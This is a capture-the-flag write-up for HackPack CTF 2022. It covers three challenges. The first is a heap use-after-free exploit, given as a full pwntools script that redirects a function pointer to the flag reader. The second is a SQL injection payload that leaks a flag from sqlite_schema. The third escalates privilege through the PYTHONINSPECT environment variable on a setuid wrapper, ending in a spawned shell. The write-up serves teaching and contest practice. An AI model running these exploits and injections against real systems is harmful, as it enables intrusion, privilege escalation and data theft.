---
title: "hackpack ctf 2022"
date: "2023-04-14"
tags: ["CTF", "hackpack", "jeopardy"]
---

# Pwn

# Number store

This challenge was a basic heap challenge. Upon execution, we are greeted with the usual menu:

```
1.) Store New Number
2.) Delete Number
3.) Edit Number
4.) Show Number
5.) Show Number List
6.) Generate Random Number
7.) Show Random Number
8.) Show Super Secret Flag
9.) Quit
```

Store allows allocating a fixed length struct and write a string to it, as well as a number that is then copied to another (useless) allocated array. Delete allows freeing a chunk (but doesn't write NULL to its pointer, leading to any sort of attacks such as double-free and use-after-free). Edit allows to edit (also free chunks). Show allows reading both the string written to the chunk and the associated name. We can also get random numbers by using options 6 and 7. These are particularly interesting, as option 6 allocates on the heap a structure which contains the function pointer to a function used to generate the random number. The binary also contains a function to read the flag.

We should also note the structure of the structs used. The struct used for random number generation and for entries are the following:

```c
struct random {
    long rand;
    long old_rand;
    long (*fn)(void);
}

struct entry {
    char name[16];
    long number;
}
```

The idea of the attack is the following: we can allocate an entry and free it. The entry chunk will end up in tcache (assuming libc version > 2.27) or in fastbins (libc version < 2.27). As the random struct has the same size, allocating it will re-use the entry chunk in both cases.
Due to incorrect free (missing pointer overwrite with NULL), we can now read/write from/to the allocated random struct!

First, we need to leak from it. To do so, we can simply use the show option. This prints both the name (which contains random numbers) and the number saved in the entry, which is the function pointer pointing to `generateRandNum`. With this leak, we can de-randomize the binary loading address.

We can now use the edit functionality to change the function pointer to `generateRandomNum` to the `printFlag` function.
When requesting a random number, `printFlag` will now be called instead.

Script:

```py
#!/usr/bin/env python3

from pwn import *

HOST = "cha.hackpack.club"
PORT = 41705

exe = ELF("./chal")

context.binary = exe
context.log_level = "debug"
context.terminal = ["kitty"]
io = None


def conn(*a, **kw):
    if args.LOCAL:
        return process([exe.path], **kw)
    elif args.GDB:
        return gdb.debug([exe.path], gdbscript=gdbscript, **kw)
    else:
        return remote(HOST, PORT, **kw)


io = conn(level="debug")


def store(idx, name, number=b"123"):
    io.sendlineafter(b"Choose option: ", b"1")
    io.sendlineafter(b"Enter index of new number (0-9): ", str(idx).encode())
    io.sendlineafter(b"Enter object name: ", name)
    io.sendlineafter(b"Enter number: ", number)


def delete(idx):
    io.sendlineafter(b"Choose option: ", b"2")
    io.sendlineafter(b"Enter index of number to delete (0-9): ", str(idx).encode())


def edit(idx, number):
    io.sendlineafter(b"Choose option: ", b"3")
    io.sendlineafter(b"Enter index of number to edit (0-9): ", str(idx).encode())
    io.sendlineafter(b"Enter new number: ", number)


def show(idx):
    io.sendlineafter(b"Choose option: ", b"4")
    io.sendlineafter(b"Select index of number to print (0-9): ", str(idx).encode())
    return io.recvlines(2, keepends=False)


def rand():
    io.sendlineafter(b"Choose option: ", b"6")


def main():
    global io

    # good luck pwning :)
    store(0, b"AAAA")
    delete(0)
    rand()
    exe.address = int(show(0)[1]) - exe.symbols.generateRandNum
    edit(0, str(exe.symbols.printFlag).encode())
    rand()

    io.interactive()


if __name__ == "__main__":
    main()
```

# Misc

## Low code low security

This challenge, which erroneously ended up in the pwn category, featured a service that would execute a workflow net written using Camunda. Even though it is not the focus of the challenge, Camunda is a process orchestrator that allows to define workflows using the workflow net formalism (a sort of Petri net with many advanced features).

The lengthy challenge description informs us that the remote instance has four handlers available for our service tasks:

- `print-current-users`
- `validate-login`: takes input variable user and pw
- `create-user`: takes input variables user and pw
- `delete-user`: takes input variable user

We first started by playing around with the service tasks by inserting random bogus data. When we first sent it to the server, we noticed something SUS inthe logs it returned:

```
2023/04/16 17:11:32 Creating Database
2023/04/16 17:11:32 Inserting test data
2023/04/16 17:11:32 UNIQUE constraint failed: users.id
2023/04/16 17:11:32 Now accepting input
2023/04/16 17:11:32 Creating BPMN engine
2023/04/16 17:11:32 Registering create-user task handler
...
```

It looks like the remote process is using a database. We quickly tried inserting a single quote in the username and password for the `validate-login` password, as it would likely be the one executing a SELECT query on the database.
The resulting logs are the following:

```
2023/04/16 17:16:18 Creating Database
2023/04/16 17:16:18 Inserting test data
2023/04/16 17:16:18 UNIQUE constraint failed: users.id
2023/04/16 17:16:18 Now accepting input
2023/04/16 17:16:18 Creating BPMN engine
2023/04/16 17:16:18 Registering create-user task handler
2023/04/16 17:16:18 Registering delete-user task handler
2023/04/16 17:16:18 Registering print-current-users task handler
2023/04/16 17:16:18 Registering validate-login task handler
2023/04/16 17:16:18 Loading BPMN file
2023/04/16 17:16:18 File loaded.
2023/04/16 17:16:18 Running engine instance
2023/04/16 17:16:18 id 2 username=admin
2023/04/16 17:16:18 Deleting user admin
2023/04/16 17:16:18 Creating user with id admin
2023/04/16 17:16:18 Validating login user='
2023/04/16 17:16:18 SQL statement=SELECT * FROM users WHERE name =''' AND pw ='''
2023/04/16 17:16:18 sql: no rows in result set
```

This confirms that this is an SQL injection! After determining the remote database (which was a weirdly aggressive sqlite3 database which would not accept NULL on an UNION if it expected a string or an int), we just had to retrieve the flag.

A nice trick about sqlite3 is that it saves the SQL of some (past?) queries in the `sqlite_schema` table. This means that we can get the flag by simply leaking the SQL used in the database. To do so, we injected the following SQL: `admin' UNION SELECT 0,'a',sql FROM sqlite_schema WHERE sql LIKE '%flag%' -- `. This returns the following:

```
...
2023/04/16 17:20:43 Validating login user=admin' UNION SELECT 0,'a',sql FROM sqlite_schema WHERE sql LIKE '%flag%' --
2023/04/16 17:20:43 SQL statement=SELECT * FROM users WHERE name ='admin' UNION SELECT 0,'a',sql FROM sqlite_schema WHERE sql LIKE '%flag%' -- ' AND pw ='admin'
2023/04/16 17:20:43 User exists with name=admin and pw=flag{eZ_M0n3y!1?}
```

## Ezila

This challange offered a remote shell to a server. In the server, there are a few interesting files:

```bash
$ ls -lah
total 64K
drwxrwxr-x 1 root  root  4.0K Apr 13 02:38 .
drwxr-xr-x 1 root  root  4.0K Apr 16 17:26 ..
-rw-rw-r-- 1 ezila ezila  187 Apr 13 02:20 CREDITS.txt
-rwxr-x--- 1 ezila ezila 7.7K Apr 13 02:20 ezila.py
-r-------- 1 ezila ezila   53 Apr 13 02:37 flag.txt
-rwsr-xr-x 1 ezila ezila  17K Apr 13 02:38 run-ezila
-r-------- 1 ezila ezila  14K Apr 13 02:20 script.txt
```

As we are not `ezila`, we can only read `CREDITS.txt` and run `run-ezila`.
After dumping the `run-ezila` ELF file, we saw that it simply was an interface to calling `ezila.py` with `uid=ezila(1001)`. There's no vulnerability in the ELF itself.

We searched around a little bit on Google due to a sentence in CREDITS.txt:

```
ELIZA-in-Python implementation forked from https://github.com/wadetb/eliza.

If you like the challenge, go give the original repo a star!

(If you don't like the challenge, blame us...)
```

It says that this is a fork. However, we could not find a fork of the linked repository, meaning that they probably lied to us.

Some hours and dumb tries later, we remembered about python environment variables. [This page](https://docs.python.org/3/using/cmdline.html) contains the full list of environment variables used by the python interpreter. There are many solutions using env variables, with the intended one probably being using `PYTHONPATH` to override some python methods called by `ezila.py`.
However, the one we found is pretty neat: [PYTHONINSPECT](https://docs.python.org/3/using/cmdline.html#envvar-PYTHONINSPECT). As per the linked docs, this variable has the same meaning of passing `-i` in the `python` cmdline, that is:

```
When a script is passed as first argument or the -c option is used, enter interactive mode after executing the script or the command, even when sys.stdin does not appear to be a terminal. The PYTHONSTARTUP file is not read.
```

In other words, the following happens: when called with this env variable set, the python interpreter, upon exit, opens a python shell. Privileges are kept as is. This means that we get a python shell with user `ezila(1001)`! We can read the flag with `open("flag.txt").read()`, or we can also get a _real_ shell:

```python
$ PYTHONINSPECT=1 ./run-ezila
running /app/ezila.py as uid=1000 (euid=1001)
How do you do.  Please tell me your problem.
> bye
bye
Goodbye.  Thank you for talking to me.
>>> import os
>>> os.setresuid(1001,1001,1001)
>>> os.system("/bin/sh")
$ id
uid=1001(ezila) gid=1000(ctfuser) groups=1000(ctfuser)
$ cat flag.txt
flag{n3v3r_7ru57_a_ch@7b07_t0_cl3@n_th3_3nv1r0nm3n7}
```
